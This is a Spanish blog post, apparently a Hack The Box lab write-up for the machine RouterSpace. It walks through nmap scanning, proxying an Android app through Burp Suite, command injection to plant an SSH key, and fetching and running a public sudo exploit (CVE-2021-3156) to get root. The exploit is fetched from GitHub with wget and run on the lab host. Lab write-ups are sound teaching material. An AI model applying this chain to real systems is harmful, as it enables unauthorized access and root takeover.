---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | RouterSpace        |
| Os                     | Linux              |
| Difficulty             | Easy               |
| Points                 | 20                 |
| IP                     | 10.10.11.148       |

## [](#header-2)Introduccion

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/RouterSpace/scan1.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

![Scan 1](/assets/images/RouterSpace/nmap1.png)

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.148
```


![Scan 2](/assets/images/RouterSpace/nmap1.png)


```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.148 -oG allPorts
```

![Scan 3](/assets/images/RouterSpace/nmap1.png)

```s
sudo nmap -sCV -p22,80 10.10.11.137 -oN targeted
```

Esta maquina contiene en su web page una .apk, la cual instalaremos en el celular y configuraremos el proxy para que se mande la informacion a burpsuite.

El primer paso, es agregar en la configuracion de proxy, un proxy listener, con la siguiente configuracion:

![Proxy burpsuite](/assets/images/RouterSpace/proxy1.png)

El segundo, en la configuracion de wifi, opciones avanzadas del celular:

![Proxy Celular](/assets/images/RouterSpace/proxy2.jpeg)

Ahora estamos listos para saber como opera la aplicacion. En un principio me lie mucho por que no establecia la comunicacion con el supuesto router, pero la configuracion estaba bien hecha, burpsuite me decia lo que intentaba hacer la aplicacion y no sabia como interpretarlo.
Me puse a investigar y encontre que podemos pasar el trafico del celular-->Burpsuite-->Owasproxy-->Internet para que no d el error de certificados TSL/SSL.
Esta es la respuesta al cargar la aplicacion:

![Proxy Celular](/assets/images/RouterSpace/request1.png)

Y procedemos a agregar el dominio routerspace.htb a nuestro /etc/hosts, ahora podremos probar un command injection en la parte del request

![Command injection](/assets/images/RouterSpace/command_injection.png)

La manera mas rapida de obtener una shell, sera copiando nuestra llave publica a /home/paul/.ssh/authorized_keys y para no quitarle el acceso a nada mas, solo haremos un append con los >>

![Command injection](/assets/images/RouterSpace/appending_idrsa_pub.png)

Ahora podemos establecer la conexion, y no se nos pedira contrasena

Escalacion de privilegios: 

Podemos compartirnos linpeas con:


```s
cp -i /root/.ssh/id_rsa linpeas.sh paul@10.10.11.148:.
```

Y despues del scann, vemos que sudo es vulnerable. Nos compartimos ahora el <a href="https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py">exploit</a>.

```s
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py 
```

Lo mandamos a la victima:

```s
scp -i /home/rebick/.ssh/id_rsa exploit_nss.py  paul@10.10.11.148:.
```

Ejecutamos el exploit e inmediatamente nos convertiremos en root.

![RouterSpace_powned](/assets/images/RouterSpace/routerspace_powned.png)